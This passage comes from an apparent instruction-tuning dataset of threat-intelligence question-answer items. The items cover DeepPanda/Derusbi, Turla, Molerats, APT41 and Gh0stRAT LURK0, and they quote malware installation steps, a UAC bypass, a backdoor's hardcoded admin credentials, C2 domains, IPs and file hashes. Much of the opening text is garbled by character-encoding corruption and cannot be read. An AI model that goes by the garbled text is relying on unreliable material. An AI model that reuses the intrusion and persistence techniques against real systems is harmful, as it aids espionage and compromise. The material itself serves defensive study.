otherwise.\n\"\ue003\ue0037KH\ue003FXUUHQWO\\\ue003ORJJHG\ue003LQ\ue003XVHUQDPH\ue003LQ\ue003WKH\ue003V\\VWHP\ue003DV\ue003REWDLQHG\ue003ZLWK\ue003WKH\ue003*HW8VHU1DPH\ue00b\ue00c\ue003$3,\n\"\ue003\ue0037KH\ue003PDFKLQH\u00b6V\ue003XSWLPH\n\"\ue003\ue0037KH\ue003:LQGRZV\ue003YHUVLRQ\ue003DQG\ue0036HUYLFH\ue0033DFN\ue003OHYHO\n\"\ue003\ue0037KH\ue003DPRXQW\ue003RI\ue003DYDLODEOH\ue0033K\\VLFDO\ue0030HPRU\\\ue003LQ\ue0030%\n\"\ue003\ue003&XUUHQW\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQV\ue003DV\ue003HQXPHUDWHG\ue003ZLWK\ue003:76(QXPHUDWH6HVVLRQV\n\"\ue003\ue003$\ue003VWULQJ\ue003LGHQWL\u00bfHU\ue003VWDWLFDOO\\\ue003VHW\ue003WR\ue003\u00b3)%,\ue015\ue013\ue014\ue014\ue014\ue013\ue015\ue017\u00b4\n7KH\ue003EHDFRQ\ue003LV\ue003HQFU\\SWHG\ue003XVLQJ\ue003DQ\ue003;25\ue012$''\ue003ORRS\ue003XVLQJ\ue003WKH\ue003VWDWLFDOO\\\ue003GH\u00bfQHG\ue003NH\\\ue003\ue013[\ue014&\ue003DQG\ue003VHQW\ue003WR\ue003WKH\ue003&\ue015\ue011\ue003\ue003\nThe following python function can be used to decode the beacon stings:\ndef decode(crypted): decoded=\"\"\nfor x in crypted:    decoded+=chr(((ord(x)^(0x1C +1)) + (0x1C +1)) & 0xFF)  return decoded\nWhen command 0x23000004 is received, a temporary new user \"_DomainUser_\" with password \"Dom4!nUserP4ss\" is created and added to the local Administrators group. The backdoor is then started under that account and the user is deleted. It would appear this technique is meant to obfuscate the activities of the malicious sample by masking the process creator's user name to appear to be a generic domain user. Note that such an account does not normally exist in an Active Directory environment.\nAdditionally, the primary C2 connection allows for requests to start additional connections to the C2 implementing the following functionality:\n\"\ue003\ue003$\ue003SURFHVV\ue003FRQWURO\ue003FRQQHFWLRQ\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue018\ue013\ue013\ue013\ue013\ue013\ue013\ue003WKDW\ue003DOORZV\ue003IRU\ue003HQXPHUDWLRQ\ue003DQG\ue003\ue003    killing of running processes\n\"\ue003\ue003$\ue003SLSHG\ue003FRPPDQG\ue003OLQH\ue003SURFHVV\ue003FRQQHFWLRQ\ue003WKDW\ue003DOORZV\ue003FRPPXQLFDWLRQ\ue003ZLWK\ue003VWDQGDUG\ue003LQSXW\ue003DQG    output of arbitrary executables; initiated by command 0x23000000\n\"\ue003\ue003$\ue003\u00bfOH\ue003EURZVHU\ue003FRQQHFWLRQ\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue014\ue013\ue013\ue013\ue013\ue013\ue013\ue003WKDW\ue003DOORZV\ue003IRU\n|\ue003 /LVWLQJ\ue003GLUHFWRU\\\ue003FRQWHQWV\n|\ue003 &RS\\LQJ\ue00f\ue003GHOHWLQJ\ue003DQG\ue003PRYLQJ\ue003\u00bfOHV\n|\ue003 2SHQLQJ\ue003\u00bfOHV\ue003XVLQJ\ue003WKH\ue0036KHOO([HFXWH\ue00b\ue00c\ue003$3,\n|\ue003 'RZQORDGLQJ\ue003DQG\ue003XSORDGLQJ\ue003\u00bfOHV\ue003IURP\ue003\ue012\ue003WR\ue003WKH\ue003&\ue015\n\"\ue003\ue003$\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQ\ue003HQXPHUDWRU\ue003LQLWLDWHG\ue003E\\\ue003FRPPDQG\ue003\ue013[\ue015\ue014\ue013\ue014\ue013\ue013\ue013\ue013\nMedium Headline: Post Exploitation Tool Sample (MD5:  2dce7fc3f52a692d8a84a0c182519133)\nThis sample is typical of a post exploitation tool; it is written in .NET 2.0. This code appears to have been compiled on Thursday May 26th, 2011 at 10:21:44 A.M. UTC (early evening time in China). The backdoor functionality can be instantiated either directly from the command line or through commands issued over a network based protocol via the C2. If no arguments are given, a connection to the C2 is initiated to the statiFDOO\\\ue003GH\u00bfQHG\ue003,3\ue003DGGUHVV\ue011\ue003\ue0037KH\ue003FRPPDQG\ue003OLQH\ue003RSWLRQV\ue003VXSSRUW\ue003SRVW\ue003H[SORLWDWLRQ\ue003FDSDELOLWLHV\ue003VXFK\ue003DV\ue003FKDQJLQJ\ue003 \u00bfOH\ue003WLPHVWDPSV\ue00f\ue003IRUHQVLF\ue003PLWLJDWLRQ\ue00f\ue003SULYLOHJH\ue003HVFDODWLRQ\ue00f\ue003ODXQFKLQJ\ue003WKH\ue003H[HFXWDEOH\ue00f\ue003DQG\ue003VSHFLI\\LQJ\ue003D\ue003VSHFL\u00bfF\ue003 C2.\n2QH\ue003LQWHUHVWLQJ\ue003FRPPDQG\ue003OLQH\ue003RSWLRQ\ue003DOORZV\ue003WKH\ue003EDFNGRRU\ue003WR\ue003\u00bfOWHU\ue003WKH\ue003FRQWHQWV\ue003RI\ue003VSHFL\u00bfHG\ue003\u00bfOHV\ue003WR\ue003UHPRYH\ue003 FRQWHQW\ue003XVLQJ\ue003D\ue003UHJXODU\ue003H[SUHVVLRQ\ue003\ue00bUHJH[\ue00c\ue011\ue003\ue0037KLV\ue003FRPPDQG\ue003WKHQ\ue003PRGL\u00bfHV\ue003WKH\ue003FUHDWLRQ\ue00f\ue003PRGL\u00bfFDWLRQ\ue00f\ue003DQG\ue003ODVW\ue003 DFFHVV\ue003WLPHVWDPSV\ue003RI\ue003WKH\ue003PRGL\u00bfHG\ue003\u00bfOH\ue003WR\ue003FRQFHDO\ue003WKH\ue003FRQWHQW\ue003PRGL\u00bfFDWLRQV\ue011\ue003\ue003$\ue003GHWDLOHG\ue003OLVWLQJ\ue003RI\ue003FRPPDQG\ue003 line arguments can be viewed in Appendix A.  This activity is generally associated with log cleaning to com-plicate a forensic investigation.\nThe sample contains an embedded IP address for C2 that is stored in an encrypted format as a string resource:\nW\ue003 \ue003\u00b3\ue014\ue017P-T<K-.FK-X7PR6=N-.D\ue017\ue015&\ue01a\ue01b\ue01b\ue018\ue01c\ue01c\ue01a%\ue018\ue015\ue016)\ue019\ue016\ue018\ue019\ue019)\ue017\ue013\ue01a)\ue016\ue01b\ue016\ue017%&&\ue018\ue017$$$\ue016\ue015\ue018\ue015\ue017\u00b4\nVariants of this Trojan are sometimes detected under the name 'Derusbi' by Microsoft, Trend, Sophos and Symantec AV engines.\nThis sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide an interactive command line shell to the C2.  It also is able to bypass User Account Control (UAC) to install itself by using the 'sysprep.exe' Microsoft Windows executable provided by the targeted system. The steps it takes to install itself onto a system are as follows:\n1. Copies itself to to %WINDIR%\\system32\\Msres<3 random characters>.ttf\n\ue015\ue011\ue003\ue003$IWHU\ue003LW\ue003FRSLHV\ue003LWVHOI\ue00f\ue003LW\ue003ZLOO\ue003PRGLI\\\ue003WKH\ue003FUHDWLRQ\ue003WLPH\ue00f\ue003ODVW\ue003DFFHVV\ue003WLPH\ue003DQG\ue003ODVW\ue003PRGL\u00bfFDWLRQ\ue003WLPH\ue003WR     the current system time when the copy was made but with the year changed to 2005.\n\ue016\ue011\ue003\ue003$GGV\ue003LWVHOI\ue003DV\ue003D\ue003VHUYLFH\ue003QDPH\ue003IURP\ue003WKH\ue003EDFNGRRU\u00b6V\ue003FRQ\u00bfJXUDWLRQ\ue003XQGHU\ue003+.(<B/2&$/B     MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<service>\" This defaults to \"wuauserv\", \ue003\ue003\ue003\ue003\ue003WKH\ue003OHJLWLPDWH\ue003:LQGRZV\ue0038SGDWH\ue003VHUYLFH\ue00f\ue003LQ\ue003WKH\ue003JLYHQ\ue003ELQDU\\\u00b6V\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue011\n4.\nAdds itself to list of services started by 'netsvc' using the service name 'helpsvc'.\n5.\nIf McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules     the copy to be deleted on reboot using the well documented MoveFileExA API.\n6. It then calls either the original or copy of regsvr32.exe with the parameters /s /u and the path to     the copy of itself it made in Step 1. The /u parameter means \"uninstall\", which calls      DllUnregisterServer, this is an unsophisticated method of DLL entry point obfuscation.\n7. DllUnregisterServer installs the driver and initiates the backdoor component.\n7KH\ue003VDPSOH\ue003LV\ue003FDSDEOH\ue003RI\ue003\u00b5GURSSLQJ\u00b6\ue003DQ\ue003HPEHGGHG\ue012HQFU\\SWHG\ue003NHUQHO\ue003GULYHU\ue011\ue003\ue003,I\ue003WKH\ue003SURFHVV\ue003\u00b3=KX'RQJ)DQJ<X\ue011 exe\" is running (AntiVirus360 program from the Chinese 'Quihoo 360 Technology Co., LTD' 360 ), or the username of the DLL's host process context is not 'SYSTEM', the driver is not written to disk.  Barring the two aforementioned conditions, the sample decrypts the kernel driver to:\n\"%sysdir%\\Drivers\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys\"\n)ROORZLQJ\ue003WKH\ue003GHFU\\SWLRQ\ue003DQG\ue003ZULWLQJ\ue003RI\ue003WKH\ue003GULYHU\ue003WR\ue003GLVN\ue00f\ue003LW\ue003LV\ue003ORDGHG\ue003XVLQJ\ue003WKH\ue003=Z/RDG'ULYHU\ue00b\ue00c\ue003$3,\ue011\ue0037KH\ue003GULY-HU\ue003LV\ue003HQFU\\SWHG\ue003ZLWK\ue003D\ue003VLPSOH\ue003IRXU\ue003E\\WH\ue003;25\ue003NH\\\ue003YDOXH\ue003RI\ue003\ue013[\ue015(\ue01b\ue01b\ue018')\ue016\ue01e\ue003DIWHU\ue003GHFU\\SWLRQ\ue003WKH\ue003\u00bfOH\ue003KDV\ue003WKH\ue0030'\ue018\ue003 hash of dae6b9b3b8e39b08b10a51a6457444d8.\n7KH\ue003PDOZDUH\ue003FRQWDLQV\ue003D\ue003G\\QDPLF\ue003FRQ\u00bfJXUDWLRQ\ue003VWRUHG\ue003LQ\ue003WKH\ue0035HJLVWU\\\ue003XQGHU\n\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Rpc\\Security\"\nDQG\ue003ORDGV\ue003D\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue003HPEHGGHG\ue003LQWR\ue003WKH\ue003ELQDU\\\ue003LI\ue003VXFK\ue003D\ue003FRQ\u00bfJXUDWLRQ\ue003LV\ue003QRW\ue003IRXQG\ue011\ue0037KH\ue003ZD\\\ue003 WKLV\ue003GHIDXOW\ue003FRQ\u00bfJXUDWLRQ\ue003LV\ue003ORDGHG\ue003DQG\ue003SDUVHG\ue003LQGLFDWHV\ue003WKDW\ue003WKLV\ue003PDOZDUH\ue003KDV\ue003EHHQ\ue003EXLOW\ue003ZLWK\ue003D\ue003\u00b5EXLOGHU\u00b6\ue003WKDW\ue003 WDNHV\ue003D\ue003WHPSODWH\ue003VDPSOH\ue003DQG\ue003OHWV\ue003DQ\ue003XQVRSKLVWLFDWHG\ue003XVHU\ue003VSHFLI\\\ue003D\ue003FRQ\u00bfJXUDWLRQ\ue003ZLWKRXW\ue003UHFRPSLOLQJ\ue003DQ\\\ue003 code.\n,I\ue003WKH\ue003FXUUHQW\ue003VHUYLFH\ue003QDPH\ue003PDWFKHV\ue003D\ue003VHW\ue003RI\ue003SUH\ue010GH\u00bfQHG\ue003VHUYLFH\ue003QDPHV\ue003WKDW\ue003OHJLWLPDWHO\\\ue003H[LVW\ue003LQ\ue003:LQGRZV\ue00f\ue003 the backdoor then loads the original service's DLL into the address space with LoadLibrary and invokes the ServiceMain export. This effectively hijacks the original service's entry while retaining its functionality.\nWhile there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default FRQ\u00bfJXUDWLRQ\ue003SUHVHQW\ue003VSHFL\u00bfHV\ue003\ue015\ue013\ue015\ue011\ue01b\ue019\ue011\ue014\ue01c\ue013\ue011\ue016\ue01d\ue01b\ue013\ue003DV\ue003D\ue003&\ue015\ue003WR\ue003XVH\ue00f\ue003WKLV\ue003LV\ue003WKH\ue003VDPH\ue003+RQJ\ue003.RQJ\ue003&\ue015\ue003VHUYHU\ue003DV\ue003 the one used by the post exploitation .NET tool.\n\nBased on the above text, answer a question. Describe the installation process of the DeepPanda malware's DLL component, including how it bypasses User Account Control (UAC) and installs itself as a service.",
    "output": "The DeepPanda malware's DLL component is installed through a series of steps. First, it copies itself to %WINDIR%\\\\system32\\\\Msres<3 random characters>.ttf and modifies the file's timestamp to appear as if it was created in 2005. It then registers itself as a service, typically using the name 'wuauserv', and adds itself to the list of services started by 'netsvc' using the service name 'helpsvc'. If McAfee AV is installed, it creates a copy of regsvr32.exe named Update.exe and schedules it for deletion on reboot. The malware then calls regsvr32.exe with specific parameters to unregister the DLL, which is an unsophisticated method of DLL entry point obfuscation. Finally, the DllUnregisterServer function installs the driver and initiates the backdoor component. The driver is decrypted and written to '%sysdir%\\\\Drivers\\\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys' unless certain conditions are met, such as the presence of specific antivirus software or if the DLL's host process context is not 'SYSTEM'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Turla APT group achieve persistence in the Neuron and Nautilus malware, allowing them to maintain their foothold on infected systems?",
    "output": "The Turla APT group achieves persistence in the Neuron and Nautilus malware through various techniques. In the Neuron client, persistence is established by creating a scheduled task that runs every 12 minutes, with a task ID of 'Microsoft Corporation' and a task description constructed from a string retrieved from a randomly selected registry value. This allows the malware to maintain its foothold on the system even after a reboot. Additionally, the Neuron service is typically installed on compromised infrastructure such as mail and web servers, and listens for HTTP requests from infected clients, acting as a Command & Control (C2) server inside the victim network. This enables the actor to evade detection by network gateway-based monitoring. In the Nautilus malware, persistence is achieved through the use of a covert store on disk, which is located in '\\ProgramData\\Microsoft\\Windows\\Caches\\'. The loader DLL accesses this covert store to decrypt the payload, which is then loaded into a target process via reflective loading. The Nautilus service also listens for HTTP requests from clients to process tasking requests, allowing the actor to maintain their foothold on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Additional Samples with Middle Eastern Themes\nWe also found a PIVY sample used by this group that leveraged what are known as key files instead of passwords. The PIVY builder allows operators to load .pik files containing a key to secure communications between the compromised computer and the attacker's machine. By default, PIVY secures these communications with the ascii text password of \"admin\" \u2014 when the same non-\u00addefault password appears in multiple attacks, researchers can conclude that the attacks are related.\nThe PIVY sample in question had an MD5 hash of 9dff139bbbe476770294fb86f4e156ac and communicated with a CnC server at toornt.servegame.com over port 443. The key file used to secure communications contained the following ascii string 'Password (256 bits):\\x0d\\x0aA9612889F6' (where \\x0d\\x0a represents a line break).\nThe 9dff139bbbe476770294fb86f4e156ac sample dropped a decoy document in Arabic that included a transcript of an interview with Salam Fayyad, the former Prime Minister of the Palestinian National Authority.\nThe sample 16346b95e6deef9da7fe796c31b9dec4 was also seen communicating with toornt.servegame.com over\nport 443. This sample appears to have been delivered to its targets via a link to a RAR archive labeled Ramadan.rar (fc554a0ad7cf9d4f47ec4f297dbde375) hosted at the Dropbox file-\u00adsharing website.\nThe sample a8714aac274a18f1724d9702d40030bf dropped a decoy document in Arabic that contained a biography of General Adbel Fattah el-\u00adSisi \u2013 the Commander-\u00adin-\u00adChief of the Egyptian Armed Forces.\nA recent sample (d9a7c4a100cfefef995785f707be895c) used protests in Egypt to entice recipients to open a malicious file.\nAnother sample (b0a9abc76a2b4335074a13939c59bfc9) contained a decoy with a grim picture of Fadel Al Radfani, who was the adviser to the defense minister of Yemen before he was assassinated.\nAlthough we are seeing Egyptian-\u00adand Middle Eastern-\u00adthemed attacks using decoy content in Arabic, we cannot determine the intended targets of all of these attacks.\nBig Headline: Delivery Vector\nWe believe that the Molerats attacker uses spear phishing to deliver weaponized RAR files containing their malicious payloads to their victims in at least two different ways. The Molerats actor will in some cases attach the weaponized RAR file directly to their spear-\u00adphishing-\u00ademails. We also believe that this actor sends spear-\u00adphishing emails that include links to RAR files hosted on third-\u00adparty platforms such as Dropbox.\nIn one such example we found the following link was used to host Ramadan.rar (fc554a0ad7cf9d4f47ec4f297dbde375):\nhxxps://dl[.]dropboxusercontent[.]com/s/uiod7orcpykx2g8/Ramadan.rar?token_hash=AAHAVuiXpTkOKwar9e0WH-\u00adEfrK7PEB9O7t7WC6Tgtn315w&dl=1\nBig Headline: CnC Infrastructure\nWe have found 15 PIVY samples that can be linked through common passwords, common CnC domain names, and common IP addresses to which the CnC domains resolve. The CnC servers for this cluster of activity are:\ntoornt.servegame.com\nupdateo.servegame.com\negypttv.sytes.net\nskype.servemp3.com\nnatco2.no-\u00adip.net\nTwo of the domain names (natco2.no-\u00adip.net and skype.servemp3.com) that were used as CnCs for PIVY were both documented as XtremeRat CnCs that were used in previous attacks. [8]\nWe focused on these domains and their IP addresses \u2014 which they had in common with toornt.servegame.com. In addition, we added the well-\u00adknown CnCs good.zapto.org and hint.zapto.org used in previously documented attacks.\nBy observing changes in DNS resolution that occurred within the same timeframe, we were able to ensure that the passive DNS data we collected was the same. Interestingly, we also found that the domains often shifted to a new IP address over time.\nOne interesting discovery concerns a sample (5b740b4623b2d1049c0036a6aae684b0) that was first seen by VirusTotal on September 14, 2012. This date is within the timeframe of the original XtremeRat attacks, but the payload in this case was PIVY. This indicates that the attackers have been using PIVY in addition to XtremeRat for longer than we had originally believed.\nBig Headline: Conclusion\nWe do not know whether using PIVY is an attempt by those behind the Molerats campaign to frame China-\u00adbased threat actors for their attacks or simply evidence that they have added another effective, publicly-\u00adavailable RAT to its arsenal. But this development should raise a warning flag for anyone tempted to automatically attribute all PIVY attacks to threat actors based in China. The ubiquity of off-\u00adthe-\u00adshelf RATs makes determining those responsible an increasing challenge.\nThe ongoing attacks are also heavily leveraging content in Arabic that uses conflicts in Egypt and the wider Middle East to lure targets into opening malicious files. But we have no further information about the exact targets of these Arabic lures.\nAs events on the ground in the Middle East \u2014 and in Egypt in particular \u2014 receive international attention, we expect the Molerat operators to continue leveraging these headlines to catalyze their operations.\n\nBased on the above text, answer a question. How does the Molerats group's use of PIVY alongside XtremeRat complicate the attribution of cyber attacks, and what challenges does this pose for cybersecurity professionals?",
    "output": "The Molerats group's use of PIVY alongside XtremeRat complicates the attribution of cyber attacks because it introduces ambiguity regarding the origin of the attacks. PIVY is often associated with China-based threat actors, while XtremeRat has been used by various groups, including those behind the Molerats campaign. The discovery of a PIVY sample (5b740b4623b2d1049c0036a6aae684b0) dating back to September 14, 2012, indicates that the attackers have been using PIVY for longer than initially believed. This overlap in tool usage makes it challenging to attribute attacks solely based on the type of malware used. Cybersecurity professionals face the challenge of distinguishing between different threat actors and must rely on a combination of indicators, including infrastructure, tactics, techniques, and procedures (TTPs), to accurately attribute attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Who Does APT41 Target?\nLike other Chinese espionage operators, APT41 espionage targeting has generally aligned with . The group has established and maintained strategic access to organizations in the healthcare, high-tech, and telecommunications sectors. APT41 operations against higher education, travel services, and news/media firms provide some indication that the group also tracks individuals and conducts surveillance. For example, the group has repeatedly targeted call record information at telecom companies. In another instance, APT41 targeted a hotel's reservation systems ahead of Chinese officials staying there, suggesting the group was tasked to reconnoiter the facility for security reasons.\nThe group's financially motivated activity has primarily focused on the video game industry, where APT41 has manipulated virtual currencies and even attempted to deploy ransomware. The group is adept at moving laterally within targeted networks, including pivoting between Windows and Linux systems, until it can access game production environments. From there, the group steals source code as well as digital certificates which are then used to sign malware. More importantly, APT41 is known to use its access to production environments to inject malicious code into legitimate files which are later distributed to victim organizations. These supply chain compromise tactics have also been characteristic of APT41's best known and most recent espionage campaigns.\nInterestingly, despite the significant effort required to execute supply chain compromises and the large number of affected organizations, APT41 limits the deployment of follow-on malware to specific victim systems by matching against individual system identifiers. These multi-stage operations restrict malware delivery only to intended victims and significantly obfuscate the intended targets. In contrast, a typical spear-phishing campaign's desired targeting can be discerned based on recipients' email addresses.\nA breakdown of industries directly targeted by APT41 over time can be found in Figure 1.\nBig Headline: Probable Chinese Espionage Contractors\nTwo identified personas using the monikers \"Zhang Xuguang\" and \"Wolfzhi\" linked to APT41 operations have also been identified in Chinese-language forums. These individuals advertised their skills and services and indicated that they could be hired. Zhang listed his online hours as 4:00pm to 6:00am, similar to APT41 operational times against online gaming\ntargets and suggesting that he is moonlighting. Mapping the group's activities since 2012 (Figure 2) also provides some indication that APT41 primarily conducts financially motivated operations outside of their normal day jobs.\nAttribution to these individuals is backed by identified persona information, their previous work and apparent expertise in programming skills, and their targeting of Chinese market-specific online games. The latter is especially notable because APT41 has repeatedly returned to targeting the video game industry and we believe these activities were formative in the group's later espionage operations.\nBig Headline: The Right Tool for the Job\nAPT41 leverages an arsenal of over 46 different malware families and tools to accomplish their missions, including publicly available utilities, malware shared with other Chinese espionage operations, and tools unique to the group. The group often relies on spear-phishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims. Once in a victim organization, APT41 can leverage more sophisticated TTPs and deploy additional malware. For example, in a campaign running almost a year, APT41 compromised hundreds of systems and used close to 150 unique pieces of malware including backdoors, credential stealers, keyloggers, and rootkits.\nAPT41 has also deployed rootkits and Master Boot Record (MBR) bootkits on a limited basis to hide their malware and maintain persistence on select victim systems. The use of bootkits in particular adds an extra layer of stealth because the code is executed prior to the operating system initializing. The limited use of these tools by APT41 suggests the group reserves more advanced TTPs and malware only for high-value targets.\nBig Headline: Fast and Relentless\nAPT41 quickly identifies and compromises intermediary systems that provide access to otherwise segmented parts of an organization's network. In one case, the group compromised hundreds of systems across multiple network segments and several geographic regions in as little as two weeks.\nThe group is also highly agile and persistent, responding quickly to changes in victim environments and incident responder activity. Hours after a victimized organization made changes to thwart APT41, for example, the group compiled a new version of a backdoor using a freshly registered command-and-control domain and compromised several systems across multiple geographic regions. In a different instance, APT41 sent spear-phishing emails to multiple HR employees three days after an intrusion had been remediated and systems were brought back online. Within hours of a user opening a malicious attachment sent by APT41, the group had regained a foothold within the organization's servers across multiple geographic regions.\nBig Headline: Looking Ahead\nAPT41 is a creative, skilled, and well-resourced adversary, as highlighted by the operation's distinct use of supply chain compromises to target select individuals, consistent signing of malware using compromised digital certificates, and deployment of bootkits (which is rare\namong Chinese APT groups).\nLike other Chinese espionage operators, APT41 appears to have moved toward strategic intelligence collection and establishing access and away from direct intellectual property theft since 2015. This shift, however, has not affected the group's consistent interest in targeting the video game industry for financially motivated reasons. The group's capabilities and targeting have both broadened over time, signaling the potential for additional supply chain compromises affecting a variety of victims in additional verticals.\nAPT41's links to both underground marketplaces and state-sponsored activity may indicate the group enjoys protections that enables it to conduct its own for-profit activities, or authorities are willing to overlook them. It is also possible that APT41 has simply evaded scrutiny from Chinese authorities. Regardless, these operations underscore a blurred line between state power and crime that lies at the heart of threat ecosystems and is exemplified by APT41.\nQ: How does APT41 leverage various malware families and tools to achieve their objectives, and what are some of the more sophisticated techniques they employ?",
    "output": "APT41 leverages over 46 different malware families and tools, including publicly available utilities, malware shared with other Chinese espionage operations, and tools unique to the group. They often use spear-phishing emails with attachments like compiled HTML (.chm) files for initial compromise. Once inside a victim organization, APT41 deploys more sophisticated TTPs and additional malware such as backdoors, credential stealers, keyloggers, and rootkits. Notably, APT41 has deployed rootkits and Master Boot Record (MBR) bootkits on a limited basis to hide their malware and maintain persistence on high-value targets, adding an extra layer of stealth.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Targeted Exploitation #11: Gh0stRAT (LURK0), PlugX, Other Malware\nThis is an instance of Gh0stRAT modified to use the string \"LURK0\" instead of \"Gh0st\" when traffic is initiated to the C2. This malicious RTF only appears to exploit\t\n \u00a0CVE-\u00ad\u20102015-\u00ad\u20101641, despite the document\t\n \u00a0matching on the Four Element\t\n \u00a0Builder kit. When the malware executes, it\t\n \u00a0launches a\t\n \u00a0hidden Internet\t\n \u00a0Explorer instance and injects into the instance with WriteMemory and CreateRemoteThread process injections:\nWRITE_MEMORY @ 0x00140000 [0x0000005c bytes] [PID: 1076] [C:\\Program Files\\Internet \t\n  Explorer\\iexplore.exe] CREATE_REMOTE_THREAD @ 0x7c80aedb\t\n  [PID: 1076] [C:\\Program Files\\Internet \t\n  Explorer\\iexplore.exe]\nThe \t\n  injected instance of Internet\t\n  Explorer starts with a\t\n  current\t\n  directory of AppData\\Roaming\\Micbt. This folder was created by the malware. The malware then initiates a\t\n  DNS query for manhaton.123nat[.]com,\nwhich at\t\n  analysis time resolved to 122.10.112[.]126. The C2 port\t\n  appears to be TCP/8030, but\t\n  was not\t\n  responding during analysis. An ASN lookup reveals that\t\n  the C2 is in China\t\n  or Hong Kong:\n133731 | 122.10.112.126 | CN | TOINTER-\u00ad\u2010AS-\u00ad\u2010AP Royal Network Technology Co., Ltd. in Guangzhou,CN\n134121\t\n \u00a0\t\n \u00a0| \t\n \u00a0122.10.112.126 | CN | RAINBOW-\u00ad\u2010HK Rainbow network limited,HK\nThe LURK0 variant\t\n  of Gh0stRAT is well documented and has been used against\t\n  the Tibetan community and others for years [33] [34] [35]. Network activity appears as such, with the telltale \"LURK0\" string appearing at\t\n  the start\t\n  of the packet.\nThe following network-\u00ad\u2010based alerts can notify organizations of Gh0stRAT LURK0 variant\t\n \u00a0traffic:\n[2016922]\t\n  ET TROJAN Backdoor family PCRat/Gh0st\t\n  CnC traffic\n[2021716]\t\n  ET TROJAN Backdoor family PCRat/Gh0st\t\n  CnC traffic (OUTBOUND) 101\n[2808814]\t\n  ETPRO TROJAN Backdoor family PCRat/Gh0st\t\n  CnC Response\nMedium Headline: IOCs\nC2: manhaton.123nat[.]com\nC2: \t\n  122.10.112[.]126\t\n  TCP/8030\nMD5 (90t69cf82.dll): 86ebcbb3bdd8af257b52daa869ddd6c1\nMD5 (RTF): b51dd4d5731b71c1a191294466cc8288\nMD5 (B412.tmp): 111273c8cba88636a036e250c2626b12\nMD5 (~tmp.doc): e538ad13417b773714b75b5d602e4c6e -\u00ad\u2010 recognized as Gh0stRAT\nMD5 (Micbt/BTFly.dump): f7c04e8b188fa38d0f62f620e3bf01dc\nMD5 (Micbt/CltID.ini): 54afa267dd5acef3858dd6dbea609cd9\nMD5 (Micbt/IconConfigBt.DAT): 516774cb0d5d56b300c402f63fe47523\nMD5 (Micbt/MemoryLoad.dump): db0f8ba69aa71e9404b52d951458b97c\nMD5 (Micbt/RasTls.dll): 1e9e9ce1445a13c1ff4bf82f4a38de0d\nMD5 (Micbt/RasTls.exe): 62944e26b36b1dcace429ae26ba66164\nSHA-\u00ad\u2010256 (90t69cf82.dll): afd0eae5065a689f8fc48c0cfc5b87f4caecc2fb6b1cef4c5e977fc2cc98509d\nSHA-\u00ad\u2010256 (RTF): a0da9887b4c5af009a41b783db7ffedf949013abc70777c0ec539299628a51eb\nSHA-\u00ad\u2010256 (B512.tmp): cdb1d2f843ce797084cfc90107a2582e4861f4051aab0f6ac374468f491232a5\nSHA-\u00ad\u2010256 (~tmp.doc): aecd3e146632e9dfa0a92f486855144df0f87181feb67ac414a618fd52960c8c\nSHA-\u00ad\u2010256 (Micbt/BTFly.dump): 3b828a81ff5b0766c99284524b18fcd10d553191741bc1ed89904cdaa79baae1\nSHA-\u00ad\u2010256 (Micbt/CltID.ini): 1590a42e67fe02892dfeb6f29e0e6ae91c503d4ea91b550557c513e92f5ac7eb\nSHA-\u00ad\u2010256 (Micbt/IconConfigBt.DAT):\n0a47bd32b83f09be1ea5a29dce6b7d307de7b3cdd69f836e0c810fd578f85c7c\nSHA-\u00ad\u2010256 (Micbt/MemoryLoad.dump): aace766acea06845c29b306a9e080edcb3407635398007f3b9b5e053198b54f4\nSHA-\u00ad\u2010256 (Micbt/RasTls.dll): bc2f7ebcad10aa48a69680f14fc57434436b821d5e7f2666a0f6d8795b0d37d1 SHA-\u00ad\u2010256 (Micbt/RasTls.exe): f9ebf6aeb3f0fb0c29bd8f3d652476cd1fe8bd9a0c11cb15c43de33bbce0bf68\nSome potentially useful Unicode strings are present\t\n  inside the RasTls files:\nUnicode Strings:\n=====================\nProgramFiles kernel32.dll\nSeDebugPrivilege\nInstall\nSOFTWARE\\Microsoft\\Windows\\DbxUpdateBT\nSOFTWARE\\Microsoft\\Windows\\\n\\%dt%dcf%d.dll\n\\MemoryLoad.dump\n\\IconConfigBt.DAT case 0\ncase 1\nGet\t\n  into InjectProMain\n%ProgramFiles%\\Internet\t\n  Explorer\\iexplore.exe\nThe iexplore.exe process (that\t\n  was the target\t\n  of process injection) loads the 90t69cf82.dll binary that\t\n  the malware also dropped.\nMedium Headline: Connections to Historical and Ongoing Threat Campaign Activity\nASERT has ten other instances of Gh0stRAT, LURK0 version in our malware repository. Passive DNS pivots on the IP address associated with manhaton.123nat[.]com (122.10.112[.]126) reveals several other potentially interesting domains that\t\n  have used this IP including: softinc[.]pw and www.tibetimes[.]com. It\t\n  is interesting to note that\t\n  this tibetimes.com domain may have been an attempt\t\n  to spoof the domain www.tibettimes.net.\t\n  Passive DNS shows a\t\n  lot\t\n  of activity, including relationships to Uyghur based domains.\nAn email address associated with these domains is lobsang[@]gmx.com and another is 2732115454[@]qq.com. The IP and these mail addresses associate with Uyghur and Tibetan themed domains as shown here:\nThe following diagram zooms in on the Uyghur-\u00ad\u2010based domain names highlighting the connection between this Gh0stRAT sample domain metadata\t\n \u00a0and other activity observed, such as the domain whitewall[.]top used in the PlugX\t\n \u00a0configuration previously mentioned.\nAdditional investigations are underway to determine the scope of the particular threat\t\n  